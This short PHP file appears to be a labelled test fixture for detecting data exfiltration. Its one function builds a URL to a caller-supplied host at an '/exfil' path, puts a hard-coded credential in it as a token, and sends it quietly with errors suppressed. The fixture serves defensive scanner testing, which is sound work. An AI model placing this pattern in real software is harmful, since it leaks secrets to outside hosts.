<?php
// Phase 11 (Track J.9) — PHP DATA_EXFIL vuln fixture.
function run($host) {
    $secret = "alice-creds";
    $url = "http://" . $host . "/exfil?token=" . urlencode($secret);
    @file_get_contents($url);
}
